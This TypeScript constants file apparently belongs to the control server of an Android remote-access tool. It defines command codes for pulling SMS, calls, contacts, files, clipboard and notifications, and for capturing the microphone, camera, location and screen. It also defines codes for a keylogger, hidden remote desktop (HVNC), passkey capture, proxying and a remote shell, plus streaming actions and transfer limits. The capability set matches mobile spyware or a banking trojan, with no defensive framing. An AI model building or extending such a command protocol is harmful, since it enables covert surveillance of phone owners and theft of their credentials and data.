/** Command protocol codes — matches Android Protocol.java channel codes. */
export const CMD = {
  FILES: '0xFI',
  SMS: '0xSM',
  CALLS: '0xCL',
  CONTACTS: '0xCO',
  MIC: '0xMI',
  LOCATION: '0xLO',
  WIFI: '0xWI',
  PERMISSIONS: '0xPM',
  APPS: '0xIN',
  PERM_CHECK: '0xGP',
  CAMERA: '0xCA',
  CLIPBOARD: '0xCB',
  NOTIFICATIONS: '0xNO',
  FASON: '0xFM',
  INFO: '0xIF',
  SCREEN: '0xSC',
  SCREEN_CTRL: '0xST',
  KEYLOGGER: '0xKL',
  WEBRTC_OFFER: '0xWO',
  WEBRTC_ANSWER: '0xWA',
  WEBRTC_ICE: '0xWC',
  HVNC: '0xHV',
  HVNC_CTRL: '0xHC',
  HVNC_OFFER: '0xHO',
  HVNC_ANSWER: '0xHA',
  HVNC_ICE: '0xHI',
  PASSKEY: '0xPK',
  PROXY: '0xPY',
  SHELL: '0xSH',
} as const;

export type CmdType = typeof CMD[keyof typeof CMD];

/** Actions accepted by the WebRTC control data channel and its REST fallback. */
export const SCREEN_ACTION = {
  STATUS: 'status',
  TAP: 'tap',
  SWIPE: 'swipe',
  GESTURE: 'gesture',
  TOUCH_START: 'touchStart',
  TOUCH_MOVE: 'touchMove',
  TOUCH_END: 'touchEnd',
  KEY: 'key',
  TEXT: 'text',
  VOLUME: 'volume',
} as const;

export type ScreenAction = typeof SCREEN_ACTION[keyof typeof SCREEN_ACTION];

/** Realtime commands that should bypass command queue for low-latency streaming. */
export const REALTIME_COMMANDS: ReadonlySet<CmdType> = new Set([
  CMD.SCREEN,
  CMD.SCREEN_CTRL,
  CMD.WEBRTC_OFFER,
  CMD.WEBRTC_ANSWER,
  CMD.WEBRTC_ICE,
  CMD.HVNC,
  CMD.HVNC_CTRL,
  CMD.HVNC_OFFER,
  CMD.HVNC_ANSWER,
  CMD.HVNC_ICE,
]);

/** Validation patterns for identifiers */
export const PATTERNS = {
  SESSION_ID: /^[A-Za-z0-9._:-]{1,128}$/,
  DEVICE_ID: /^[A-Za-z0-9._:-]{1,128}$/,
} as const;

/** Size limits for data transfer */
export const LIMITS = {
  MAX_CHUNK_BASE64_LENGTH: 67_108_864, // ~64 MB encoded, ~48 MB decoded
  MAX_TOTAL_CHUNKS: 10_000,
  MAX_ICE_SERVERS: 8,
  MAX_SDP_LENGTH: 2_000_000,
  MAX_ICE_CANDIDATE_LENGTH: 16_384,
  MAX_ICON_SIZE: 5 * 1024 * 1024,
  MAX_APP_NAME_LENGTH: 50,
  MAX_PASSWORD_LENGTH: 128,
  MIN_PASSWORD_LENGTH: 8,
  MAX_USERNAME_LENGTH: 30,
  MIN_USERNAME_LENGTH: 3,
  MAX_EMAIL_LENGTH: 254,
} as const;
